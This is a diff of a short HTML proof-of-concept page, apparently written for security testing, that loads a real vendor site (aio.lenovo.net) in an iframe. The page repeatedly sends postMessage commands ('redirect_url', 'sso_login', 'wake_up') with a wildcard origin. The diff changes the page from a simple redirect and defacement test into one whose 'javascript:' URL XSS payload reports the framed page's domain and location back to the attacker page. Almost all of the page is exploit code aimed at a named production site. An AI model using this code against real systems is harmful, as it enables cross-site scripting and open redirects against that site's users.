@@ -1,26 +1,30 @@
-<!doctype html>
-<meta charset="utf-8">
+<!doctype html><meta charset="utf-8">
 <button onclick="testRedirect()">验证跳转</button>
-<button onclick="testXss()">验证XSS</button>
+<button onclick="testXss()">验证XSS(回传)</button>
 <pre id="log"></pre>
 <iframe id="v" src="https://aio.lenovo.net/" style="width:100%;height:700px"></iframe>
-
 <script>
 const f = document.getElementById('v');
-const log = (m)=>document.getElementById('log').textContent += m + "\n";
+const log = m => document.getElementById('log').textContent += m + '\n';
 
-function sendAll(url){
-  ['redirect_url','sso_login','wake_up'].forEach(a=>{
-    f.contentWindow.postMessage({action:a, url:url}, '*'); // 关键：*
-    log('[send] ' + a + ' -> ' + url);
-  });
+window.addEventListener('message', e => {
+  log('[recv] origin=' + e.origin + ' data=' + JSON.stringify(e.data));
+});
+f.addEventListener('load', ()=>log('[iframe load] ' + new Date().toISOString()));
+
+function spray(url){
+  const acts=['redirect_url','sso_login','wake_up'];
+  let n=0;
+  const t=setInterval(()=>{
+    n++;
+    acts.forEach(a=>f.contentWindow.postMessage({action:a,url},'*'));
+    log('[send#'+n+'] ' + url);
+    if(n>=10) clearInterval(t);
+  },200);
 }
 
-function testRedirect(){
-  sendAll('https://example.com/?t=' + Date.now());
-}
-
+function testRedirect(){ spray('about:blank#pwn-'+Date.now()); }
 function testXss(){
-  sendAll('javascript:document.body.innerHTML="<h1 style=color:red>XSS:"+document.domain+"</h1>"');
+  spray("javascript:top.postMessage({type:'xss_ok',domain:document.domain,href:location.href},'*')");
 }
 </script>
